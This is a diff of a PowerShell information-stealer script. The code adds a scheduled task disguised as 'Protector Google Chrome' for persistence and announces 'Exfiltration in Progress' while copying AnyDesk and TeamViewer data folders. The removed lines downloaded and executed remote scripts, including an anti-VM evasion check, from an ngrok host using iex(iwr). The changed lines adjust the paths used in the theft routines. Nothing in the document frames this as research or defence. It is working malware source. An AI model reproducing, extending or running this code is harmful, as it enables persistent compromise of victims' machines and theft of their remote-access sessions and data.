@@ -275,22 +275,8 @@ function Invoke-TASKS {
         Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Protector Google Chrome" -RunLevel Highest -Force | Out-Null
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
-    if ($blockhostsfile) {
-        $link = "https://panel.ngrok.app/main/frontend-src/blockhosts.ps1"
-        iex (iwr -Uri $link -UseBasicParsing)
-    }
     Backup-Data
 }
-
-function VMPROTECT {
-    $link = ("https://panel.ngrok.app/main/frontend-src/antivm.ps1")
-    iex (iwr -uri $link -useb)
-    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
-}
-if ($vm_protect) {
-    VMPROTECT
-}
-
 
 function Request-Admin {
     while (-not (CHECK_AND_PATCH)) {
@@ -308,8 +294,7 @@ function Request-Admin {
     }    
 }
 
-function Backup-Data {
-    
+function Backup-Data {  
     Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
@@ -904,7 +889,8 @@ function Backup-Data {
 	# AnyDesk
 	function anydesk_backup {
 		$sourcePath = "$env:USERPROFILE\AppData\Roaming\AnyDesk"
-		$destinationPath = "$global:vnc_clients\AnyDesk"
+		$destinationPath = "$vnc_clients\"
+		$pathLogFile = "$destinationPath\AnyDesk\backup_path.txt"
 		if (-Not (Test-Path -Path $sourcePath)) {
 			Write-Output "[!] The source AnyDesk directory $sourcePath does not exist." -ForegroundColor Red
 			return
@@ -919,6 +905,7 @@ function Backup-Data {
 			New-Item -ItemType Directory -Path $destinationPath
 		}
 		Copy-Item -Path $sourcePath -Destination $destinationPath -Recurse -Force
+		$sourcePath | Out-File -FilePath $pathLogFile -Encoding UTF8
 		Write-Output "[+] Successfully backed up AnyDesk directory: $latestDirPath" -ForegroundColor Green
 		$global:vncCounter = $true
 	}
@@ -927,7 +914,7 @@ function Backup-Data {
 	# TeamViewer
 	function teamviewer_backup {
 		$sourcePath = "$env:USERPROFILE\AppData\Local\TeamViewer\EdgeBrowserControl\Temporary"
-		$destinationPath = "$global:vnc_clients\TeamViewer"
+		$destinationPath = "$vnc_clients\TeamViewer"
 		$pathLogFile = "$destinationPath\backup_path.txt"
 		if (-Not (Test-Path -Path $sourcePath)) {
 			Write-Output "[!] The source TeamViewer directory does not exist." -ForegroundColor Red
